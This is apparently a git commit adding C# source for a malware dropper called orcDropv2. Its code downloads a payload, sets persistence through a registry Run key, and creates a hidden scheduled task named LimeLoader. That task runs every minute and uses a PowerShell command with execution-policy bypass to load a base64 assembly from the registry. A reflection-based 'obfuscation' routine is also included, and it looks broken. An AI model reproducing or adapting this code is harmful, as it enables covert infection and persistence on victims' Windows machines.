81b53592d8e19245ce3bf3eade82827d01e47110
XzedinDev <144139631+XzedinDev@users.noreply.github.com>
2023-09-05 16:07:54 +0200

    Add files via upload

---
+++ Obfuscate.cs
@@ -0,0 +1,63 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace orcDropv2
+{
+    internal class Obfuscate
+    {
+        public static void ObfuscateSourceCode()
+        {
+            // Generate random characters for variable and function names
+            string randomChars = Guid.NewGuid().ToString("n");
+
+            // Obtain the assembly that holds the code to obfuscate
+            Assembly assembly = Assembly.GetExecutingAssembly();
+
+            // Loop through all types in the assembly
+            foreach (Type type in assembly.GetTypes())
+            {
+                // Generate a random string to replace the type name
+                string randomString = Guid.NewGuid().ToString("n");
+
+                // Rename the type
+                MarshalType(type, randomString);
+
+                // Loop through all methods in the type
+                foreach (MethodInfo method in type.GetMethods())
+                {
+                    // Rename the method
+                    MarshalMember(method, randomString, randomChars);
+
+                    // ... Feel free to add more obfuscation techniques here ...
+                }
+            }
+        }
+
+        // Renames the type using reflection
+        private static void MarshalType(Type type, string randomString)
+        {
+            RuntimeHelpers.RunClassConstructor(type.TypeHandle);
+            type.TypeHandle.GetType().GetField("m_name", BindingFlags.NonPublic | BindingFlags.Instance)
+                .SetValue(type.TypeHandle.GetType().TypeHandle, randomString.ToCharArray());
+        }
+
+        // Renames the method using reflection
+        private static void MarshalMember(MethodInfo method, string randomString, string randomChars)
+        {
+            method.GetType().GetField("m_name", BindingFlags.NonPublic | BindingFlags.Instance)
+                .SetValue(method.GetType().TypeHandle, randomString.ToCharArray());
+
+            method.GetType().GetField("m_signature", BindingFlags.NonPublic | BindingFlags.Instance)
+                .SetValue(method.GetType().TypeHandle, randomChars.ToCharArray());
+
+            if (method.GetType().GetField("m_bIsRomInit", BindingFlags.NonPublic | BindingFlags.Instance) != null)
+                method.GetType().GetField("m_bIsRomInit", BindingFlags.NonPublic | BindingFlags.Instance)
+                    .SetValue(method.GetType().TypeHandle, true);
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,62 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace orcDropv2
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            string Payload = DownloadMalware("https://127.0.0.1/Payload.exe");
+            AddPayloadToRegistry();
+            AddToSchtasks();
+            Obfuscate.ObfuscateSourceCode();
+
+        }
+
+        private static string DownloadMalware(string url)
+        {
+            using (WebClient wc = new WebClient())
+            {
+                return wc.DownloadString(url);
+            }
+            
+        }
+
+        private static void AddPayloadToRegistry()
+        {
+            // Get the current user's registry hive
+            RegistryKey registryKey = Registry.CurrentUser;
+
+            // Open the desired registry path
+            RegistryKey subKey = registryKey.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+
+            // Add your payload to the registry
+            subKey.SetValue("PayloadName", "C:\\Path\\To\\Your\\Payload.exe");
+
+            subKey.Close();
+            registryKey.Close();
+        }
+
+        //AddToSchtasks method taken from NYAN-CAT's dropper
+        private static void AddToSchtasks()
+        {
+            string PS = @"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\Dropless-Malware\).Payload)).EntryPoint.Invoke($Null,$Null)";
+            Process.Start(new ProcessStartInfo()
+            {
+                FileName = "schtasks",
+                Arguments = "/create /sc minute /mo 1 /tn LimeLoader /tr " + "\"" + PS + "\"",
+                CreateNoWindow = true,
+                ErrorDialog = false,
+                WindowStyle = ProcessWindowStyle.Hidden
+            });
+
+        }
+    }
+}
